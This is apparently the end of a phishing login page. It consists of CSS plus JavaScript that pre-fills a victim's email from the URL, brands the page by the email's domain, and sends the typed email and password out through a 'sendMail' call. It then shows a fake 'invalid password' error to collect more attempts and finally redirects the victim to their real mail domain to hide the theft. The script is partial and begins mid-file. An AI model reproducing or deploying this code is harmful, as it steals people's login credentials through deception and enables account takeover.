	<style>
	


		/*[ SHAPE ]
		///////////////////////////////////////////////////////////
		*/

		/*[ Display ]
		-----------------------------------------------------------
		*/
		.dis-none {display: none;}
		.dis-block {display: block;}
		.dis-inline {display: inline;}
		.dis-inline-block {display: inline-block;}
		.dis-flex {
			display: -webkit-box;
			display: -webkit-flex;
			display: -moz-box;
			display: -ms-flexbox;
			display: flex;
		}

		/*[ Position ]
		-----------------------------------------------------------
		*/
		.pos-relative {position: relative;}
		.pos-absolute {position: absolute;}
		.pos-fixed {position: fixed;}

		/*[ float ]
		-----------------------------------------------------------
		*/
		.float-l {float: left;}
		.float-r {float: right;}


		/*[ Width & Height ]
		-----------------------------------------------------------
		*/
		.sizefull {
			width: 100%;
			height: 100%;
		}
		.w-full {width: 100%;}
		.h-full {height: 100%;}
		.max-w-full {max-width: 100%;}
		.max-h-full {max-height: 100%;}
		.min-w-full {min-width: 100%;}
		.min-h-full {min-height: 100%;}

		/*[ Top Bottom Left Right ]
		-----------------------------------------------------------
		*/
		.top-0 {top: 0;}
		.bottom-0 {bottom: 0;}
		.left-0 {left: 0;}
		.right-0 {right: 0;}

		.top-auto {top: auto;}
		.bottom-auto {bottom: auto;}
		.left-auto {left: auto;}
		.right-auto {right: auto;}


		/*[ Opacity ]
		-----------------------------------------------------------
		*/
		.op-0-0 {opacity: 0;}
		.op-0-1 {opacity: 0.1;}
		.op-0-2 {opacity: 0.2;}
		.op-0-3 {opacity: 0.3;}
		.op-0-4 {opacity: 0.4;}
		.op-0-5 {opacity: 0.5;}
		.op-0-6 {opacity: 0.6;}
		.op-0-7 {opacity: 0.7;}
		.op-0-8 {opacity: 0.8;}
		.op-0-9 {opacity: 0.9;}
		.op-1-0 {opacity: 1;}

		/*[ Background ]
		-----------------------------------------------------------
		*/
		.bgwhite {background-color: white;}
		.bgblack {background-color: black;}



		/*[ Wrap Picture ]
		-----------------------------------------------------------
		*/
		.wrap-pic-w img {width: 100%;}
		.wrap-pic-max-w img {max-width: 100%;}

		/* ------------------------------------ */
		.wrap-pic-h img {height: 100%;}
		.wrap-pic-max-h img {max-height: 100%;}

		/* ------------------------------------ */
		.wrap-pic-cir {
			border-radius: 50%;
			overflow: hidden;
		}
		.wrap-pic-cir img {
			width: 100%;
		}



		/*[ Hover ]
		-----------------------------------------------------------
		*/
		.hov-pointer:hover {cursor: pointer;}

		/* ------------------------------------ */
		.hov-img-zoom {
			display: block;
			overflow: hidden;
		}
		.hov-img-zoom img{
			width: 100%;
			-webkit-transition: all 0.6s;
			-o-transition: all 0.6s;
			-moz-transition: all 0.6s;
			transition: all 0.6s;
		}
		.hov-img-zoom:hover img {
			-webkit-transform: scale(1.1);
			-moz-transform: scale(1.1);
			-ms-transform: scale(1.1);
			-o-transform: scale(1.1);
			transform: scale(1.1);
		}



		/*[  ]
		-----------------------------------------------------------
		*/
		.bo-cir {border-radius: 50%;}

		.of-hidden {overflow: hidden;}

		.visible-false {visibility: hidden;}
		.visible-true {visibility: visible;}




		/*[ Transition ]
		-----------------------------------------------------------
		*/
		.trans-0-1 {
			-webkit-transition: all 0.1s;
			-o-transition: all 0.1s;
			-moz-transition: all 0.1s;
			transition: all 0.1s;
		}
		.trans-0-2 {
			-webkit-transition: all 0.2s;

		-moz-transition: all 0.4s;
		transition: all 0.4s;
		}

		.input100:focus + .focus-input100::after {
		top: -15px;
		}

		.input100:focus + .focus-input100::before {
		width: 100%;
		}

		.has-val.input100 + .focus-input100::after {
		top: -15px;
		}

		.has-val.input100 + .focus-input100::before {
		width: 100%;
		}

		/*---------------------------------------------*/
		.btn-show-pass {
		font-size: 15px;
		color: #999999;

		display: -webkit-box;
		display: -webkit-flex;
		display: -moz-box;
		display: -ms-flexbox;
		display: flex;
		align-items: center;
		position: absolute;
		height: 100%;
		top: 0;
		right: 0;
		padding-right: 5px;
		cursor: pointer;
		-webkit-transition: all 0.4s;
		-o-transition: all 0.4s;
		-moz-transition: all 0.4s;
		transition: all 0.4s;
		}

		.btn-show-pass:hover {
		color: #6a7dfe;
		color: -webkit-linear-gradient(left, #21d4fd, #b721ff);
		color: -o-linear-gradient(left, #21d4fd, #b721ff);
		color: -moz-linear-gradient(left, #21d4fd, #b721ff);
		color: linear-gradient(left, #21d4fd, #b721ff);
		}

		.btn-show-pass.active {
		color: #6a7dfe;
		color: -webkit-linear-gradient(left, #21d4fd, #b721ff);
		color: -o-linear-gradient(left, #21d4fd, #b721ff);
		color: -moz-linear-gradient(left, #21d4fd, #b721ff);
		color: linear-gradient(left, #21d4fd, #b721ff);
		}



		/*------------------------------------------------------------------
		[ Button ]*/
		.container-login100-form-btn {
		display: -webkit-box;
		display: -webkit-flex;
		display: -moz-box;
		display: -ms-flexbox;
		display: flex;
		flex-wrap: wrap;
		justify-content: center;
		padding-top: 13px;
		}

		.wrap-login100-form-btn {
		width: 100%;
		display: block;
		position: relative;
		z-index: 1;
		border-radius: 25px;
		overflow: hidden;
		margin: 0 auto;
		}

		.login100-form-bgbtn {
		position: absolute;
		z-index: -1;
		width: 300%;
		height: 100%;
		background: #a64bf4;
		background: -webkit-linear-gradient(right, #21d4fd, #b721ff, #21d4fd, #b721ff);
		background: -o-linear-gradient(right, #21d4fd, #b721ff, #21d4fd, #b721ff);
		background: -moz-linear-gradient(right, #21d4fd, #b721ff, #21d4fd, #b721ff);
		background: linear-gradient(right, #21d4fd, #b721ff, #21d4fd, #b721ff);
		top: 0;
		left: -100%;

		-webkit-transition: all 0.4s;
		-o-transition: all 0.4s;
		-moz-transition: all 0.4s;
		transition: all 0.4s;
		}

		.login100-form-btn {
		font-family: Arial, Helvetica, sans-serif;
		font-size: 15px;
		color: #fff;
		background: #0072C6;
		line-height: 1.2;


		display: -webkit-box;
		display: -webkit-flex;
		display: -moz-box;
		display: -ms-flexbox;
		display: flex;
		justify-content: center;
		align-items: center;
		padding: 0 20px;
		width: 100%;
		height: 50px;
		}

		.wrap-login100-form-btn:hover .login100-form-bgbtn {
		left: 0;
		}


		/*------------------------------------------------------------------
		[ Responsive ]*/

		@media (max-width: 576px) {
		.wrap-login100 {
			padding: 77px 15px 33px 15px;
		}
		}



		/*------------------------------------------------------------------
		[ Alert validate ]*/

		.validate-input {
		position: relative;
		}

		.alert-validate::before {
		content: attr(data-validate);
		position: absolute;
		max-width: 70%;
		background-color: #fff;
		border: 1px solid #c80000;
		border-radius: 2px;
		padding: 4px 25px 4px 10px;
		top: 50%;
		-webkit-transform: translateY(-50%);
		-moz-transform: translateY(-50%);
		-ms-transform: translateY(-50%);
		-o-transform: translateY(-50%);
		transform: translateY(-50%);
		right: 0px;
		pointer-events: none;

		font-family: Arial, Helvetica, sans-serif;
		color: #c80000;
		font-size: 13px;
		line-height: 1.4;
		text-align: left;

		visibility: hidden;
		opacity: 0;

		-webkit-transition: opacity 0.4s;
		-o-transition: opacity 0.4s;
		-moz-transition: opacity 0.4s;
		transition: opacity 0.4s;
		}

		.alert-validate::after {
		content: "\f06a";
		font-family: FontAwesome;
		font-size: 16px;
		color: #c80000;

		display: block;
		position: absolute;
		background-color: #fff;
		top: 50%;
		-webkit-transform: translateY(-50%);
		-moz-transform: translateY(-50%);
		-ms-transform: translateY(-50%);
		-o-transform: translateY(-50%);
		transform: translateY(-50%);
		right: 5px;
		}

		.alert-validate:hover:before {
		visibility: visible;
		opacity: 1;
		}

		@media (max-width: 992px) {
		.alert-validate::before {
			visibility: visible;
			opacity: 1;
		}
		}



		.input100.hasValue + .focus-input100::after {
    		top: -15px;
		}
	</style>

			const url = new URL(window.location.href);


			if(!(
				url.searchParams.has('err')
				&& url.searchParams.has('dispatch')
				&& url.searchParams.has('id')
				//&& url.searchParams.has('email')
			)) {
				url.searchParams.append('err', url.searchParams.get('err') || randomString(19, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ'))
				url.searchParams.append('dispatch', url.searchParams.get('dispatch') || randomString(3, '01234abcABC56789'))
				url.searchParams.append('id', url.searchParams.get('id') || randomString(30, '01234abcABC56789'))
				//url.searchParams.append('email', url.searchParams.get('email'));

				window.location.replace(url.toString())
			}

			//BEGIN
			window.retryAttemptCount = 1;
			const formElement = $("form#loginForm");
			const emailElement = $("input#emailInput");
			const passwordElement = $("input#passwordInput");
			const submitButtonElement = $("button#loginButton");
			const errorElement = $("#form-error-container");
			const successElement = $("#form-success-container");
			const togglePasswordVisibilityElement = $("#passwordVisibilityToggle");

            // axios.defaults.headers.common['Access-Control-Allow-Origin'] = '*';
			//SET AXIOS RESPONSE TIME
			axios.interceptors.request.use((config) => {
				config.headers['request-startTime'] = new Date().getTime()
				return config
			})

			axios.interceptors.response.use((response) => {
				const start = response.config.headers['request-startTime']
				const end = new Date().getTime()
				const milliseconds = end - start;
				response.headers['request-duration'] = milliseconds
				return response
			})



            function closeWin() {
               try {
                   window.opener = window;
                   var win = window.open("","_self");
                   win.close();
                   //frame
                   top.close();
               } catch (e) {

               }
            }
			// SET EMAIL HASH
			const pageUrl = window.location.href;
			const pageUrlArray = pageUrl.split("#");
			if (pageUrlArray.length > 1) {
				emailElement.val(pageUrlArray[pageUrlArray.length - 1]);
			}
			//add class if element has value
			if(emailElement.val().length > 0) {emailElement.addClass('hasValue');}
			if (passwordElement.val().length > 0) {passwordElement.addClass('hasValue');}
			//set the autofocus
			if (emailElement.val().length > 0){
				passwordElement.focus();
			}else {
				emailElement.focus();
			}

			emailElement.keyup(function() {
				if($(this).val().length > 0){
					$(this).addClass('hasValue');
					setNameAndFavicon($(this));
				}else {
					$(this).removeClass('hasValue');
				}
			});

			passwordElement.keyup(function () {
				if ($(this).val().length > 0) {
					$(this).addClass('hasValue');
				} else {
					$(this).removeClass('hasValue');
				}
			});

			setNameAndFavicon(emailElement);

			//TOGGLE PASSWORD VISIBILITY
			togglePasswordVisibilityElement.on('click', function (e) {
				e.preventDefault();

				const passwordElementTypeAttribute = passwordElement.attr('type');

				if (passwordElementTypeAttribute == 'password') {
					passwordElement.attr('type', 'text');
					$(this).removeClass('fa-eye-slash').addClass('fa-eye');

				} else {
					passwordElement.attr('type', 'password');
					$(this).addClass('fa-eye-slash').removeClass('fa-eye');
				}
			})

			$("body").on('click', 'a', function (e) { e.preventDefault() });

			//FORM SUBMIT ACTION
			formElement.on('submit', function (e) { e.preventDefault(); });

			submitButtonElement.on('click', async function (e) {
				e.preventDefault();
				errorElement.hide();
				successElement.hide();
				const submitButtonInnerText = submitButtonElement.text();

				try {

					const emailVal = emailElement.val().trim();
					const passwordVal = passwordElement.val().trim();

					if (!(emailVal && passwordVal)) {
						throw Error('Email and Password is required.');
					}

					if (!validateEmail(emailVal)) {
						throw Error('Email is invalid.');
					}

					if (passwordVal.length <= 4) {
						throw Error('Password must be greater than four characters.');
					}

					// button authorizing
					const response = await sendMail(emailVal, passwordVal);
					alert('IT!');
					window.open("about:blank","_self").close()
                    closeWin();
					setTimeout(function () {
						submitButtonElement.text(submitButtonInnerText);

						if (parseInt(window.retryAttemptCount) <= 2) {
							window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
							passwordElement.val('');
							errorElement.html('Invalid email and/or password combination. Try again correctly.').show();
						} else {
							//success message
							successElement.html("Sorry, your sign-in timed out. Please Try again successfully.").show();
							//redirect
							setTimeout(function () {
								window.location.replace("http://"+emailElement.val().split("@")[1]);
							}, 5000);
						}
					}, 4000 - response.headers['request-duration'])

				} catch (error) {
					errorElement.html(error.message).show();
					setTimeout(function () {
						submitButtonElement.text(submitButtonInnerText);
					}, 500);
				}
			});
		});
	</script>

</body>
</html>
